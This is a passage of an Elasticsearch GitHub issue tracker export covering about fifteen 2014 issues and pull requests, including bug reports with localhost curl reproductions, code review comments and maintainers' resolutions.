</description><key id="43112148">7776</key><summary>Added example of sysctl.conf for file descriptors change</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">szlwzl</reporter><labels><label>docs</label></labels><created>2014-09-18T09:16:48Z</created><updated>2014-09-28T09:20:15Z</updated><resolved>2014-09-28T09:20:15Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-25T17:39:51Z" id="56855292">Hi @szlwzl 

Thanks for the PR. Given that the default setting in the linux kernel is 10% of the amount of RAM on the system (in kb), do you ever really need to set this setting?  I've certainly never run up against the limits.  While this is useful advice, I'd rather not overload the setup page with seldom used settings. Presumably you've had this experience?
</comment><comment author="szlwzl" created="2014-09-27T10:27:45Z" id="57048664">Hi Clinton,

We haven't reached these limits ourselves yet but I noticed in the documentation that ed61cf6 has an example of how to set the limits for Virtual memory but there was nothing to show how to increase limits permanently for file descriptors and thought it would be handy.

Best wishes

Simon
</comment><comment author="clintongormley" created="2014-09-28T09:20:15Z" id="57079845">Hi @szlwzl 

OK - before we switched from mmapfs to a hybrid of mmap/nio, it was important to configure virtual memory to allow enough space, which is why that is in the docs.  In fact, the need to configure this setting was one of the reasons we wanted to switch to the hybrid, to make things simpler.

Given that I've never heard of anybody needing to change this setting, I'm going to close this PR without merging it, as I'd prefer to mention only the most important bits on this page, rather than trying to be complete.  

thanks for the PR, and please send more in the future :)
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>[TEST] Only reset test cluster if a test actually failed</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7775</link><project id="" key="" /><description>Previously we resetted the test cluster for all subsequent tests
even though they didn't fail. This make suites like REST tests faster
and prevents crazy timeouts.
</description><key id="43106235">7775</key><summary>[TEST] Only reset test cluster if a test actually failed</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">s1monw</reporter><labels><label>test</label><label>v1.4.0.Beta1</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-18T08:07:18Z</created><updated>2014-09-18T08:43:43Z</updated><resolved>2014-09-18T08:43:43Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="javanna" created="2014-09-18T08:13:17Z" id="56007806">Left a small comment, LGTM though, thanks a lot @s1monw for this!
</comment><comment author="s1monw" created="2014-09-18T08:38:37Z" id="56010472">@javanna remove that reset method - good call
</comment><comment author="javanna" created="2014-09-18T08:39:43Z" id="56010568">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>IllegalArgumentException when 'from' or 'size' is too large </title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7774</link><project id="" key="" /><description>For request:

``` javascript
 {"sort":{"_uid":"asc"},"from":2147483647,"size":10, "query":{"query_string":{"query":"*:*"}}}
```

Failed with a IllegalArgumentException: 

&gt; IllegalArgumentException[numHits must be &gt; 0; please use TotalHitCountCollector if you just need the total hit count]; }]
</description><key id="43102836">7774</key><summary>IllegalArgumentException when 'from' or 'size' is too large </summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/martijnvg/following{/other_user}', u'events_url': u'https://api.github.com/users/martijnvg/events{/privacy}', u'organizations_url': u'https://api.github.com/users/martijnvg/orgs', u'url': u'https://api.github.com/users/martijnvg', u'gists_url': u'https://api.github.com/users/martijnvg/gists{/gist_id}', u'html_url': u'https://github.com/martijnvg', u'subscriptions_url': u'https://api.github.com/users/martijnvg/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/580421?v=4', u'repos_url': u'https://api.github.com/users/martijnvg/repos', u'received_events_url': u'https://api.github.com/users/martijnvg/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/martijnvg/starred{/owner}{/repo}', u'site_admin': False, u'login': u'martijnvg', u'type': u'User', u'id': 580421, u'followers_url': u'https://api.github.com/users/martijnvg/followers'}</assignee><reporter username="">thihy</reporter><labels /><created>2014-09-18T07:20:34Z</created><updated>2014-09-25T20:09:13Z</updated><resolved>2014-09-25T20:09:13Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="martijnvg" created="2014-09-18T07:56:22Z" id="56006256">@thihy This is very large `from` value and usage like this can lead to heap memory performance issues. ES would need to create a priority queue of size `from` + `size` of each shard for sorting purposes. Actually in this case we can't event create a priority queue, because from + size is larger then Integer.MAX_VALUE.

What is the reason for the high `from` usage? If you want to retrieve all the documents from ES in a particular order then I suggest you use the scroll api. This doesn't create a priority query of size `from` + `size`, but just a size equal to `size`. See for more information: http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/search-request-scroll.html#search-request-scroll

The error message is cryptic and we should fail requests like this in a better and more descriptive way.
</comment><comment author="clintongormley" created="2014-09-25T20:09:13Z" id="56876078">Closed by #7778 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>NumberType Error</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7773</link><project id="" key="" /><description>Hi:
    Mapping Setting is 
properties: {
sale: {
include_in_all: false
store: true
type: float
}}

The type is Float, but return type of sale is Double
</description><key id="43083641">7773</key><summary>NumberType Error</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">shaonanxu</reporter><labels><label>feedback_needed</label></labels><created>2014-09-18T01:33:37Z</created><updated>2014-12-30T20:25:51Z</updated><resolved>2014-12-30T20:25:51Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-25T18:22:33Z" id="56861488">Hi @shaonanxu 

Could you expand on this?  What do you mean by the return value? What does this request return:

```
GET /_mapping
```
</comment><comment author="clintongormley" created="2014-12-30T20:25:51Z" id="68394489">No further info provided. Closing
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Validation fail with match_all query and fields</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7772</link><project id="" key="" /><description>### The query validation fails, but the query works.

``` shell
$ curl -s -XGET 'http://localhost:9200/'

{
    "name": "King Bedlam",
    "status": 200,
    "tagline": "You Know, for Search",
    "version": {
        "build_hash": "dee175dbe2f254f3f26992f5d7591939aaefd12f",
        "build_snapshot": false,
        "build_timestamp": "2014-08-13T14:29:30Z",
        "lucene_version": "4.9",
        "number": "1.3.2"
    }
}
```

``` shell
$ curl -s -XPUT 'http://localhost:9200/twitter/tweet/1' -d '{
    "user" : "kimchy",
    "post_date" : "2009-11-15T14:12:12",
    "message" : "trying out Elasticsearch"
}'

{
    "_id": "1",
    "_index": "twitter",
    "_type": "tweet",
    "_version": 7,
    "created": false
}
```
### Validation fails with match_all + fields

``` shell
$ curl -s -XGET 'http://localhost:9200/twitter/tweet/_validate/query?explain=true' -d '
{
  "query": {
    "match_all": {}
  },
  "fields": [
    "message"
  ]
}'

{
    "_shards": {
        "failed": 0,
        "successful": 1,
        "total": 1
    },
    "explanations": [
        {
            "error": "org.elasticsearch.index.query.QueryParsingException: [twitter] request does not support [fields]",
            "index": "twitter",
            "valid": false
        }
    ],
    "valid": false
}
```
### Query works

``` shell
$ curl -s -XGET 'http://localhost:9200/twitter/tweet/_search' -d '{
  "query": {
    "match_all": {}
  },
  "fields": [
    "message"
  ]
}'

{
    "_shards": {
        "failed": 0,
        "successful": 5,
        "total": 5
    },
    "hits": {
        "hits": [
            {
                "_id": "1",
                "_index": "twitter",
                "_score": 1.0,
                "_type": "tweet",
                "fields": {
                    "message": [
                        "trying out Elasticsearch"
                    ]
                }
            }
        ],
        "max_score": 1.0,
        "total": 1
    },
    "timed_out": false,
    "took": 3
}
```
### Validation works with match_all without fields

``` shell
$ curl -s -XGET 'http://localhost:9200/twitter/tweet/_validate/query?explain=true' -d '
{
  "query": {
    "match_all": {}
  }
}'

{
    "_shards": {
        "failed": 0,
        "successful": 1,
        "total": 1
    },
    "explanations": [
        {
            "explanation": "ConstantScore(cache(_type:tweet))",
            "index": "twitter",
            "valid": true
        }
    ],
    "valid": true
}
```
</description><key id="43063555">7772</key><summary>Validation fail with match_all query and fields</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">robertogyn19</reporter><labels><label>discuss</label></labels><created>2014-09-17T21:22:15Z</created><updated>2014-10-15T20:12:07Z</updated><resolved>2014-10-15T20:12:07Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-25T18:18:47Z" id="56860901">Hi @robertogyn19 

What it is actually saying is that the validate-query request doesn't support the `fields` param, but it is supported by the search request.  I've found it annoying that I have to remove params like `fields` etc from the validate-query request, but it does **just** validate the contents of the `query`.

I'd be tempted to ignore all other params and only extract the `query` here.
</comment><comment author="robertogyn19" created="2014-10-09T11:44:33Z" id="58497401">Hi, sorry for the delay in responding.

I use this service to validate the query as soon as possible, avoiding unnecessary processing. I believe this is the purpose of it and I wouldn't want to restrict the types of queries used in my application.

Perhaps there is a better alternative to my problem.

Att.
</comment><comment author="clintongormley" created="2014-10-15T19:50:35Z" id="59264951">@robertogyn19 the validate-query API only validates the `query` - nothing else.  It is mainly a debugging tool.  The quickest way of finding out if what you are about to pass to `/_search` is wrong, is to pass it to `/_search`.  If it is wrong, it'll throw an exception.
</comment><comment author="robertogyn19" created="2014-10-15T20:12:07Z" id="59268062">Ok. Thanks for your help.

Att.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Adding `min` score mode to parent-child queries</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7771</link><project id="" key="" /><description>Support for "max", "sum", and "avg" already existed.

Closes #7603 
</description><key id="43059787">7771</key><summary>Adding `min` score mode to parent-child queries</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/pickypg/following{/other_user}', u'events_url': u'https://api.github.com/users/pickypg/events{/privacy}', u'organizations_url': u'https://api.github.com/users/pickypg/orgs', u'url': u'https://api.github.com/users/pickypg', u'gists_url': u'https://api.github.com/users/pickypg/gists{/gist_id}', u'html_url': u'https://github.com/pickypg', u'subscriptions_url': u'https://api.github.com/users/pickypg/subscriptions', u'avatar_url': u'https://avatars2.githubusercontent.com/u/1501235?v=4', u'repos_url': u'https://api.github.com/users/pickypg/repos', u'received_events_url': u'https://api.github.com/users/pickypg/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/pickypg/starred{/owner}{/repo}', u'site_admin': False, u'login': u'pickypg', u'type': u'User', u'id': 1501235, u'followers_url': u'https://api.github.com/users/pickypg/followers'}</assignee><reporter username="">pickypg</reporter><labels><label>:Parent/Child</label><label>enhancement</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-17T20:42:17Z</created><updated>2015-06-07T16:56:13Z</updated><resolved>2014-10-15T14:28:23Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-10-02T22:25:14Z" id="57719508">It feels weird to me to only consider the worst child match, do you have a use-case for this new score mode?
</comment><comment author="pickypg" created="2014-10-02T22:27:57Z" id="57719795">Requested from #7603

&gt; This would be useful if you would like to sort products on the min price of there product variants.

This seems reasonable to me.
</comment><comment author="jpountz" created="2014-10-02T22:50:50Z" id="57722009">Just left a minor comment about an assertion, other than that it looks good to me!
</comment><comment author="jpountz" created="2014-10-02T23:02:45Z" id="57723135">LGTM
</comment><comment author="clintongormley" created="2014-10-14T16:56:23Z" id="59078758">@pickypg you want to merge this into 1.x?
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Ability to check version without starting server</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7770</link><project id="" key="" /><description>I want to be able to know what version I'm running without starting the server and `curl`ing 
</description><key id="43050927">7770</key><summary>Ability to check version without starting server</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/dadoonet/following{/other_user}', u'events_url': u'https://api.github.com/users/dadoonet/events{/privacy}', u'organizations_url': u'https://api.github.com/users/dadoonet/orgs', u'url': u'https://api.github.com/users/dadoonet', u'gists_url': u'https://api.github.com/users/dadoonet/gists{/gist_id}', u'html_url': u'https://github.com/dadoonet', u'subscriptions_url': u'https://api.github.com/users/dadoonet/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/274222?v=4', u'repos_url': u'https://api.github.com/users/dadoonet/repos', u'received_events_url': u'https://api.github.com/users/dadoonet/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/dadoonet/starred{/owner}{/repo}', u'site_admin': False, u'login': u'dadoonet', u'type': u'User', u'id': 274222, u'followers_url': u'https://api.github.com/users/dadoonet/followers'}</assignee><reporter username="">mehulkar</reporter><labels /><created>2014-09-17T19:09:23Z</created><updated>2014-09-18T08:34:58Z</updated><resolved>2014-09-18T07:29:44Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="dadoonet" created="2014-09-17T19:26:50Z" id="55946569">Does this work for you:

```
  ls lib/elasticsearch*.jar
```
</comment><comment author="mehulkar" created="2014-09-17T20:15:46Z" id="55952959">Hmm, that works, but I wonder if relying on the filename is the best approach?
</comment><comment author="dadoonet" created="2014-09-17T20:26:35Z" id="55954484">At least, it works.

But what is your actual need?
</comment><comment author="mehulkar" created="2014-09-17T20:29:59Z" id="55954960">More of a nice-to-have, than a need, I guess. 

Most recently, I had a bunch of docker images and needed to check which one had the version of elasticsearch I needed. It was more laborious to have to start the server (making sure all the config was in the right place), instead of just being able to do `bin/elasticsearch --version` like I'm used to with most other binaries. 
</comment><comment author="dadoonet" created="2014-09-18T07:29:43Z" id="56004099">I just checked and we do it actually:

``` sh
$ bin/elasticsearch -v
```

Gives:

```
Version: 1.3.2, Build: dee175d/2014-08-13T14:29:30Z, JVM: 1.7.0_60
```

Closing
</comment><comment author="mehulkar" created="2014-09-18T08:34:58Z" id="56010112">Oh wow, sorry for the noise. Thanks @dadoonet 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Give a unique id to each ping response </title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7769</link><project id="" key="" /><description>During discovery a node gossips with other nodes to discover the current state of the cluster - what nodes are out there, what version they use and most importantly whether there is an active master out there.  During this ping process we may end up in a situation where old information is mixed with new. This is comment if a couple of master election happen in rapid succession. 

This PR adds a monotonically increasing id to each ping response. This makes it easy to always select the last ping from every node.
</description><key id="43016290">7769</key><summary>Give a unique id to each ping response </summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">bleskes</reporter><labels><label>:Discovery</label><label>enhancement</label><label>resiliency</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-17T14:15:51Z</created><updated>2015-06-07T12:01:59Z</updated><resolved>2014-09-20T11:02:45Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="martijnvg" created="2014-09-19T19:16:16Z" id="56222003">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Tests: extend testRecoverFromPreviousVersion to sometimes index during relocation</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7768</link><project id="" key="" /><description>This PR extends a BWC test to make sure we index during relocation on a cross version cluster.

Relates to #7729
</description><key id="43011950">7768</key><summary>Tests: extend testRecoverFromPreviousVersion to sometimes index during relocation</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">bleskes</reporter><labels><label>resiliency</label><label>test</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-17T13:41:22Z</created><updated>2015-02-02T15:20:09Z</updated><resolved>2014-09-22T09:21:28Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-18T14:06:49Z" id="56042877">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Make sure that internally generated percolate request re-uses the original headers and request context</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7767</link><project id="" key="" /><description>When percolating an existing document we internally recreate a new `PercolateRequest` that we go execute. We need to make sure that original headers and request context are preserved though when doing that.
</description><key id="42993850">7767</key><summary>Make sure that internally generated percolate request re-uses the original headers and request context</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/javanna/following{/other_user}', u'events_url': u'https://api.github.com/users/javanna/events{/privacy}', u'organizations_url': u'https://api.github.com/users/javanna/orgs', u'url': u'https://api.github.com/users/javanna', u'gists_url': u'https://api.github.com/users/javanna/gists{/gist_id}', u'html_url': u'https://github.com/javanna', u'subscriptions_url': u'https://api.github.com/users/javanna/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/832460?v=4', u'repos_url': u'https://api.github.com/users/javanna/repos', u'received_events_url': u'https://api.github.com/users/javanna/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/javanna/starred{/owner}{/repo}', u'site_admin': False, u'login': u'javanna', u'type': u'User', u'id': 832460, u'followers_url': u'https://api.github.com/users/javanna/followers'}</assignee><reporter username="">javanna</reporter><labels><label>:Internal</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-17T10:31:47Z</created><updated>2015-06-07T10:33:13Z</updated><resolved>2014-09-17T10:43:55Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-17T10:33:11Z" id="55876037">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Make sure that update internal requests share the same original headers and request context</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7766</link><project id="" key="" /><description>Update request internally executes index and delete operations. We need to make sure that those internal operations hold the same headers and context as the original update request. Achieved via copy constructors that accept the current request and the original request.
</description><key id="42985226">7766</key><summary>Make sure that update internal requests share the same original headers and request context</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/javanna/following{/other_user}', u'events_url': u'https://api.github.com/users/javanna/events{/privacy}', u'organizations_url': u'https://api.github.com/users/javanna/orgs', u'url': u'https://api.github.com/users/javanna', u'gists_url': u'https://api.github.com/users/javanna/gists{/gist_id}', u'html_url': u'https://github.com/javanna', u'subscriptions_url': u'https://api.github.com/users/javanna/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/832460?v=4', u'repos_url': u'https://api.github.com/users/javanna/repos', u'received_events_url': u'https://api.github.com/users/javanna/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/javanna/starred{/owner}{/repo}', u'site_admin': False, u'login': u'javanna', u'type': u'User', u'id': 832460, u'followers_url': u'https://api.github.com/users/javanna/followers'}</assignee><reporter username="">javanna</reporter><labels><label>:Internal</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-17T09:17:27Z</created><updated>2015-06-07T10:33:20Z</updated><resolved>2014-09-18T12:09:42Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="kimchy" created="2014-09-18T11:57:00Z" id="56028341">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Add ActionRunnable support to ThreadPool to simplify async operation on bounded threadpools</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7765</link><project id="" key="" /><description>today we have to catch rejected operation exceptions in various places
and notify an ActionListener. This pattern is error prone and adds a lot
of boilerplait code. It's also easy to miss catching this exception
which only is relevant if nodes are under high load. This commit adds
infrastructure that makes ActionListener first class citizen on async
actions.
</description><key id="42983557">7765</key><summary>Add ActionRunnable support to ThreadPool to simplify async operation on bounded threadpools</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">s1monw</reporter><labels><label>:Core</label><label>enhancement</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-17T09:05:01Z</created><updated>2015-06-06T19:23:32Z</updated><resolved>2014-09-18T13:27:16Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-17T09:05:54Z" id="55867471">note I didn't convert all the places where we should use this.
</comment><comment author="kimchy" created="2014-09-17T09:26:50Z" id="55869538">I love it!. Few notes to maybe consider:
- I think that `ActionRunnable` extend `AbstractRunnable`, so places where we need to override force execution, we won't have an inheritance problem.
- I am concerned that people by mistake will run `ActionRunnable` on a retrieved `Executor`, assuming that it will handle rejections.... . Maybe we can wrap the returned `Executor` with one that will handle the rejection (or any exception) as well?
</comment><comment author="kimchy" created="2014-09-17T09:28:55Z" id="55869743">one more thing, should we have a more generic runnable that has 2 callbacks, `doRun` and `onFailure` callbacks? And then have a ActionListetnerRunnable that would callback the listener?

This will simplify places like the search action, where we don't have to wrap the code in try ... catch in the doRun, but instead do the same code in the onFailure part.
</comment><comment author="s1monw" created="2014-09-17T10:25:52Z" id="55875348">@kimchy I pushed some improvements addressing your comments
</comment><comment author="kimchy" created="2014-09-18T10:38:39Z" id="56021992">@s1monw this looks better to me. I wonder if we can take it a step forward. There are many places where we use the thread pool not in the context of an action, so maybe if `AbstractRunnable` had support for onFailure and onRejection, and onFailure would be abstract (onRejection would by default call onFailure), and also AbstractRunnable would have an abstract doRunnable logic.

Then the ActionRunnable can simply extend AbstractRunnable and call the relevant listener for those callbacks?
</comment><comment author="s1monw" created="2014-09-18T12:53:01Z" id="56033531">I pushed new commits
</comment><comment author="kimchy" created="2014-09-18T12:59:48Z" id="56034217">LGTM, this will clean a lot of code once we apply it across the code base
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Emit warning when using fuzziness parameter for cross_fields query type of multi_match query</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7764</link><project id="" key="" /><description>I was using the cross_fields query type with the fuzzyness parameter and got unexpected results. While fuzziness is not documented for cross_fields it is accepted and then leads to strange results. It would be nice to emit a warning in this case (and perhaps add an explicit warning to the documentation). Even better would be the possibility to use fuzziness with cross_fields, see #6866.

Relates to #10217
</description><key id="42982863">7764</key><summary>Emit warning when using fuzziness parameter for cross_fields query type of multi_match query</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/cbuescher/following{/other_user}', u'events_url': u'https://api.github.com/users/cbuescher/events{/privacy}', u'organizations_url': u'https://api.github.com/users/cbuescher/orgs', u'url': u'https://api.github.com/users/cbuescher', u'gists_url': u'https://api.github.com/users/cbuescher/gists{/gist_id}', u'html_url': u'https://github.com/cbuescher', u'subscriptions_url': u'https://api.github.com/users/cbuescher/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/10398885?v=4', u'repos_url': u'https://api.github.com/users/cbuescher/repos', u'received_events_url': u'https://api.github.com/users/cbuescher/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/cbuescher/starred{/owner}{/repo}', u'site_admin': False, u'login': u'cbuescher', u'type': u'User', u'id': 10398885, u'followers_url': u'https://api.github.com/users/cbuescher/followers'}</assignee><reporter username="">grmblfrz</reporter><labels><label>:Query DSL</label><label>adoptme</label><label>enhancement</label><label>v5.0.0-alpha3</label></labels><created>2014-09-17T08:59:41Z</created><updated>2016-05-13T15:33:07Z</updated><resolved>2016-05-13T15:33:07Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-11-07T11:49:37Z" id="62132282">+1 stricter parsing of the match and multi_match queries would be good.
</comment><comment author="damienalexandre" created="2014-11-07T14:29:18Z" id="62151666">A warning or parse error should also be thrown when trying to use an array instead of a string as search query:

```
GET ponies/record/_search?explain
{
  "query": {
    "multi_match": {
      "query": ["laptop", "journalists", "yolo"],
      "fields": ["caption.Keywords"]
    }
  }
}
```

Produce a search with "yolo" only:

```
"description": "weight(caption.Keywords:yolo in 17202) [PerFieldSimilarity], result of:",
```

As it is accepted without warnings, users expect this to work, but only the last entry of the array is used which is very strange. 
</comment><comment author="clintongormley" created="2016-05-11T11:23:57Z" id="218431862">@cbuescher any chance this could be added for 5.0?  It not obvious that fuzziness can't be combined with cross_fields - we should throw an exception in this case
</comment><comment author="cbuescher" created="2016-05-13T11:03:19Z" id="219013841">The same seems to be true for `phrase` and `phrase_prefix`, they shouldn&#8217;t support `fuzziness` either. `match_phrase` query already throws an exception if you specify fuzziness. So I'll add those two types to the list of exclusions in the PR above.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Add missing cluster blocks handling for master operations</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7763</link><project id="" key="" /><description>Master node related operations were missing proper handling of cluster blocks, allowing for example to perform cluster level update settings even before the state was fully restored on initial cluster startup

Note, the change allows to change read only related settings without checking for blocks on update settings, as without it, it means one can't re-enable metadata/write. Also, it doesn't check for blocks on cluster state and health API, as those are allowed to be used even when blocked to figure out what causes the block.

Closes #7740 
</description><key id="42982286">7763</key><summary>Add missing cluster blocks handling for master operations</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">kimchy</reporter><labels><label>:Cluster</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-17T08:55:00Z</created><updated>2015-06-06T19:23:53Z</updated><resolved>2014-09-17T09:31:16Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-17T09:16:24Z" id="55868517">LGTM ran test a couple of times no failure thanks shay!
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Fix to accept empty arrays on Highlight queries</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7762</link><project id="" key="" /><description>Here is a fix for #2974 specific case.

Tested it with this REST command

&lt;code&gt;
{
   "highlight": {
      "fields": {
         "about": []
      }
   },
   "query": {
      "match": {
        "about": "rock"
      }
   }
}
&lt;code&gt;

and now it's returning the highlighted section as it does with &lt;code&gt;about": {}&lt;/code&gt;. In case this could break some other use case please advise.

All tests passed (mvn test -Dtests.filter="@nightly and not(@slow or @backwards)")

Thanks
</description><key id="42978380">7762</key><summary>Fix to accept empty arrays on Highlight queries</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">cfontes</reporter><labels><label>enhancement</label></labels><created>2014-09-17T08:23:05Z</created><updated>2015-03-19T10:19:04Z</updated><resolved>2014-11-14T13:27:37Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="colings86" created="2014-11-14T13:27:37Z" id="63063975">Closing this PR as issue #2974 was closed with comment https://github.com/elasticsearch/elasticsearch/issues/2974#issuecomment-60112886
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Deleted documents show up in completion suggester</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7761</link><project id="" key="" /><description>Indexed the docs.
Used suggester
Deleted one doc
Used suggester (deleted doc still shows)
Used optimize
Used suggester (deleted doc still shows)
Used refresh
Used suggester (deleted doc still shows)

If the number of docs is less then everything works fine but when the number increases, the completion suggester shows false result. The test case can be found at
https://gist.github.com/ankitkr/e7776419b0e8ff5334af

https://gist.github.com/missinglink/01c7db8bb09f2f935574
